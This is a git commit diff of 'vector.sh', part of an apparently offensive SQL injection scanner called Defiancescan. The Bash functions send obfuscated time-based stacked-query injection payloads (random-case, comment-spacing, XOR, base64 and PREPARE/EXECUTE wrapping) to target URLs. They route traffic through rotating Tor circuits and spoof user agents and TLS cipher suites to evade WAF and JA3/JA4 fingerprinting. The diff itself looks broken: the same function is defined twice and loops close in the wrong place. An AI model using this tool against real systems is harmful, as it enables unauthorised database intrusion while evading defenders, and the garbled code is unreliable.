f9ce5f331ceb2fb52690cdb1f71527ffb1ecfe17
Skokoo <nourriwilliam789@gmail.com>
2026-08-10 05:56:06 +0700

    Update vector.sh

--- Imcurvin/vector.sh
+++ Imcurvin/vector.sh
@@ -2,111 +2,130 @@
 # Copyright 2026 Skokoo
 # Licensed under the Apache License, Version 2.0
 
-# Sourced to Defiancescan.sh
-
+# Sourced to Defiancescan.sh           
 vector_sqli_agressor_left() {
   local current_param="${TARGET_PARAM:-id}"
+  local is_raw_post=false
+  if [[ ! "$target_url" =~ ^https?:// ]] && [[ "$target_url" == *"="* ]] && [ "${REQ_METHOD}" = "POST" ]; then
+    is_raw_post=true
+  fi
 
   while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
     if [[ "$default_path" == "/" ]]; then
       default_path=""
     fi
-    
+
     local random_port
     random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
 
-      local current_time
-      current_time=$(date +%H:%M:%S)
+    local current_time
+    current_time=$(date +%H:%M:%S)
 
-      local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+    local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+    local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+    local random_ua="$base_ua"
 
-      local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
-      local random_ua="$base_ua"
+    local ua_salt
+    ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+    local target_cipher=""
+    local target_tls13=""
+    local rapid_reset_args="--http2 --parallel --parallel-max 50"
 
-      local ua_salt
-      ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-      local target_cipher=""
-      local target_tls13=""
-      local rapid_reset_args="--http2 --parallel --parallel-max 50"
+    local chunked_headers=(-H "Content-Type: application/x-www-form-urlencoded")
 
-      # Used chunked headers only on POST method.
-      local chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
+    if [[ "$base_ua" == *"Firefox"* ]]; then
+      random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
+      target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+      target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
+    elif [[ "$base_ua" == *"iPhone"* ]]; then
+      random_ua="${base_ua} Mobile/15E148 Safari/604.1"
+      target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
+      target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+    else
+      random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
+      target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+      target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+    fi
 
-      # Enforce strict TLS 1.3 compliance and bypass JA3/JA4 fingerprinting defenses        
-      if [[ "$base_ua" == *"Firefox"* ]]; then
-        random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
-        target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
-        target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
-      elif [[ "$base_ua" == *"iPhone"* ]]; then
-        random_ua="${base_ua} Mobile/15E148 Safari/604.1"
-        target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
-        target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-      else
-        random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
-        target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
-        target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-      fi
+    local defiance_tamper_path=""
+    local final_query=""
+    local raw_payload="$query_payload"
+    local t2=$(randomcase_engine "$raw_payload")
+    local t4=$(space2comment_engine "$t2")
+    local hex_xor=$(xor_engine "$t4")
+    local b64_payload=$(base64_engine "$hex_xor")
+    local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
-      local defiance_tamper_path=""
-      local final_query=""
-      local raw_payload="$query_payload"
-      local t2=$(randomcase_engine "$raw_payload")
-      local t4=$(space2comment_engine "$t2")
-      local hex_xor=$(xor_engine "$t4")
-      local b64_payload=$(base64_engine "$hex_xor")
-      local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
-
-      local waf_args=$(braindamage)
-
-      local clean_target_url="${target_url%%\?*}"
+    local waf_args=$(braindamage)
+    
+    local clean_target_url="$target_url"
+    if [ "$is_raw_post" = false ]; then
+      clean_target_url="${target_url%%\?*}"
       if [[ "$clean_target_url" != *"/"* && "$clean_target_url" != *"?"* ]]; then
         clean_target_url="${clean_target_url}/"
       fi
+    fi
 
-      local active_payload=""
-      if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-        active_payload="$t4"
+    local active_payload=""
+    if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+      active_payload="$t4"
+    else
+      active_payload="$defiance_tamper_path"
+    fi
+
+    local current_method="${REQ_METHOD:-POST}"
+    
+    local join_char="?"
+    if [[ "$target_url" =~ \? ]]; then
+      join_char="&"
+    fi
+
+    if [[ "$payloadsi" = "true" ]]; then
+      output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Executing request [$send_to_url]"
+    else
+      local technique_name="Generic Time-Based"
+      case "${raw_payload}" in
+        *"benchmark"*) technique_name="Stacked Queries Time-Based (Heavy Benchmark)" ;;
+        *"randomblob"*) technique_name="Stacked Queries Time-Based (CPU-Exhaustion Blob)" ;;
+        *"extractvalue"*|*"updatesxml"*) technique_name="Stacked Queries Time-Based (XML Function Nested)" ;;
+        *"json_keys"*) technique_name="Stacked Queries Time-Based (JSON Object Nested)" ;;
+        *"sleep"*) technique_name="Stacked Queries Time-Based (Sub-Query Sleep)" ;;
+      esac
+      output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
+    fi
+    echo -e "$output_text"      
+
+    if [ "$current_method" = "POST" ]; then
+      local post_data=""
+      local send_to_url=""
+
+      if [ "$is_raw_post" = true ]; then
+        post_data=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")        
+        send_to_url="$clean_target_url"
       else
-        active_payload="$defiance_tamper_path"
+        post_data="${current_param}=${active_payload}"
+        send_to_url="$clean_target_url"
       fi
 
-      local current_method="${REQ_METHOD:-POST}"
-local join_char="?"
-      if [[ "$target_url" == *"?"* ]]; then
-        join_char="&"
+      local payload_length=${#post_data}
+      if [ "$payload_length" -gt 250 ]; then
+        chunked_headers+=(-H "Transfer-Encoding: chunked")
       fi
 
-      if [[ "$payloadsi" = "true" ]]; then
-        output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Executing: \033[38;5;238m[${target_url}${join_char}${current_param}=${active_payload}]\033[0m"
-      else
-        local technique_name="Generic Time-Based"
-        case "${raw_payload}" in
-          *"benchmark"*) technique_name="Stacked Queries Time-Based (Heavy Benchmark)" ;;
-          *"randomblob"*) technique_name="Stacked Queries Time-Based (CPU-Exhaustion Blob)" ;;
-          *"extractvalue"*|*"updatesxml"*) technique_name="Stacked Queries Time-Based (XML Function Nested)" ;;
-          *"json_keys"*) technique_name="Stacked Queries Time-Based (JSON Object Nested)" ;;
-          *"sleep"*) technique_name="Stacked Queries Time-Based (Sub-Query Sleep)" ;;
-        esac
-        output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
-      fi
-      echo -e "$output_text"      
+      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+        --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+        -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
+        -w "%{time_total}|%{http_code}" \
+        "$send_to_url")
+    else
+      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
+        --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+        -m 12 -A "$random_ua" -s -o /dev/null \
+        -w "%{time_total}|%{http_code}" \
+        "${clean_target_url}${join_char}${current_param}=${active_payload}")
+    fi
 
-      if [ "$current_method" = "POST" ]; then
-        local post_data="${current_param}=${active_payload}"
-
-        curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
-          --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-          -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
-          -w "%{time_total}|%{http_code}" \
-          "$clean_target_url")
-      else
-        curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
-          --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-          -m 12 -A "$random_ua" -s -o /dev/null \
-          -w "%{time_total}|%{http_code}" \
-          "${clean_target_url}${join_char}${current_param}=${active_payload}")
-      fi
-
+  done
       local stopwatch
       local http_status
       stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
@@ -138,94 +157,112 @@ local join_char="?"
     done < <(shuf "$WORDLIST_MYSQL")
   }
 
-  vector_sqli_agressor_right() {
-    local current_param="${TARGET_PARAM:-id}"
+vector_sqli_agressor_left() {
+  local current_param="${TARGET_PARAM:-id}"
+  local is_raw_post=false
+  if [[ ! "$target_url" =~ ^https?:// ]] && [[ "$target_url" == *"="* ]] && [ "${REQ_METHOD}" = "POST" ]; then
+    is_raw_post=true
+  fi
 
-    while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
-      if [[ "$default_path" == "/" ]]; then
-        default_path=""
+  while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
+    if [[ "$default_path" == "/" ]]; then
+      default_path=""
+    fi
+
+    local random_port
+    random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
+
+    local current_time
+    current_time=$(date +%H:%M:%S)
+
+    local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+    local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+    local random_ua="$base_ua"
+
+    local ua_salt
+    ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+    local target_cipher=""
+    local target_tls13=""
+    local rapid_reset_args="--http2 --parallel --parallel-max 50"
+
+    local chunked_headers=(-H "Content-Type: application/x-www-form-urlencoded")
+
+    if [[ "$base_ua" == *"Firefox"* ]]; then
+      random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
+      target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+      target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
+    elif [[ "$base_ua" == *"iPhone"* ]]; then
+      random_ua="${base_ua} Mobile/15E148 Safari/604.1"
+      target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
+      target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+    else
+      random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
+      target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+      target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+    fi
+
+    local defiance_tamper_path=""
+    local final_query=""
+    local raw_payload="$query_payload"
+    local t2=$(randomcase_engine "$raw_payload")
+    local t4=$(space2comment_engine "$t2")
+    local hex_xor=$(xor_engine "$t4")
+    local b64_payload=$(base64_engine "$hex_xor")
+    local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+
+    local waf_args=$(braindamage)   
+    local clean_target_url="$target_url"
+    if [ "$is_raw_post" = false ]; then
+      clean_target_url="${target_url%%\?*}"
+      if [[ "$clean_target_url" != *"/"* && "$clean_target_url" != *"?"* ]]; then
+        clean_target_url="${clean_target_url}/"
+      fi
+    fi
+
+    local active_payload=""
+    if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+      active_payload="$t4"
+    else
+      active_payload="$defiance_tamper_path"
+    fi
+
+    local current_method="${REQ_METHOD:-POST}"
+    
+    local join_char="?"
+    if [[ "$target_url" =~ \? ]]; then
+      join_char="&"
+    fi      
+
+    if [ "$current_method" = "POST" ]; then
+      local post_data=""
+      local send_to_url=""
+
+      if [ "$is_raw_post" = true ]; then
+        post_data=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
+        send_to_url="$clean_target_url"
+      else
+        post_data="${current_param}=${active_payload}"
+        send_to_url="$clean_target_url"
       fi
 
-      local random_port
-      random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
+      local payload_length=${#post_data}
+      if [ "$payload_length" -gt 250 ]; then
+        chunked_headers+=(-H "Transfer-Encoding: chunked")
+      fi
 
-        local current_time
-        current_time=$(date +%H:%M:%S)
-
-        local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
-
-        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
-        local random_ua="$base_ua"
-
-        local ua_salt
-        ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-
-        local target_cipher=""
-        local target_tls13=""
-        local rapid_reset_args="--http2 --parallel --parallel-max 50"
-
-        local chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
-
-        if [[ "$base_ua" == *"Firefox"* ]]; then
-          random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
-          target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
-          target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
-        elif [[ "$base_ua" == *"iPhone"* ]]; then
-          random_ua="${base_ua} Mobile/15E148 Safari/604.1"
-          target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
-          target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-        else
-          random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
-          target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
-          target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-        fi
-
-        local defiance_tamper_path=""
-        local final_query=""
-        local raw_payload="$query_payload"
-        local t2=$(randomcase_engine "$raw_payload")
-        local t4=$(space2comment_engine "$t2")
-        local hex_xor=$(xor_engine "$t4")
-        local b64_payload=$(base64_engine "$hex_xor")
-        local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
-
-        local waf_args=$(braindamage)
-
-        local clean_target_url="${target_url%%\?*}"
-        if [[ "$clean_target_url" != *"/"* && "$clean_target_url" != *"?"* ]]; then
-          clean_target_url="${clean_target_url}/"
-        fi
-
-        local active_payload=""
-        if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-          active_payload="$t4"
-        else
-          active_payload="$defiance_tamper_path"
-        fi
-
-        local current_method="${REQ_METHOD:-POST}"
-
-        local join_char="?"
-        if [[ "$target_url" == *"?"* ]]; then
-          join_char="&"
-        fi
-
-        if [ "$current_method" = "POST" ]; then
-          local post_data="${current_param}=${active_payload}"
-
-          curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
-            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-            -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
-            -w "%{time_total}|%{http_code}" \
-            "$target_url")
-        else
-          curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
-            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-            -m 12 -A "$random_ua" -s -o /dev/null \
-            -w "%{time_total}|%{http_code}" \
-            "${target_url}${join_char}${current_param}=${active_payload}")
-        fi
-
+      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+        --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+        -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
+        -w "%{time_total}|%{http_code}" \
+        "$send_to_url")
+    else
+      curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
+        --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+        -m 12 -A "$random_ua" -s -o /dev/null \
+        -w "%{time_total}|%{http_code}" \
+        "${clean_target_url}${join_char}${current_param}=${active_payload}")
+    fi
+done
         local stopwatch
         local http_status
         stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
